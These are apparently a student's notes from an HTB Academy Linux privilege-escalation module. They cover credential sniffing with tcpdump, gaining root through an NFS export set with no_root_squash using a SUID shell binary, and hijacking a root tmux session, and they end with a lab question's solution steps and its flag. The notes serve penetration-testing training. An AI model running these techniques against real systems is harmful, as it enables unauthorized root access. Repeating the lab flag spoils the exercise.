## Passive Traffic Capture

If `tcpdump` is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.
## Weak NFS Privileges

Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command `showmount -e`, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.

```shell-session
KaoruRyusaki@htb[/htb]$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

When an NFS volume is created, various options can be set:

|Option|Description|
|---|---|
|`root_squash`|If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.|
|`no_root_squash`|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|

```shell-session
htb@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

For example, we can create a SETUID binary that executes `/bin/sh` using our local root user. We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.

```shell-session
htb@NIX02:~$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```shell-session
htb@NIX02:/tmp$ gcc shell.c -o shell
```

```shell-session
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.

```shell-session
htb@NIX02:/tmp$  ls -la

total 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
```

```shell-session
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

## Hijacking Tmux Sessions

Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.

```shell-session
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

If we can compromise a user in the `devs` group, we can attach to this session and gain root access.

Check for any running `tmux` processes.

```shell-session
htb@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Confirm permissions.

```shell-session
htb@NIX02:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

Review our group membership.

```shell-session
htb@NIX02:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Finally, attach to the `tmux` session and confirm root privileges.

```shell-session
htb@NIX02:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```




#### Question

Review the NFS server's export list and find a directory holding a flag.

* Download the VPN file from the HTB Academy webpage
* Open your VM and go to your Downloads page from the terminal
* Run the command " openvpn academy-regular.ovpn " (if it doesnt work try running the same command with sudo)
* Use the user and password given by HTB and then SSH to the target system spawned for you by running this command "ssh htb-student@\<ip given>\"
* Run command " cat /etc/exports " at the end of the file you will see 2 available folders which are "/tmp"  and "/var/nfs/general "
* Move to the "/var/nfs/general " folder, there is a " exports_flag.txt " you can check
* fc8c065b9384beaa162afe436a694acf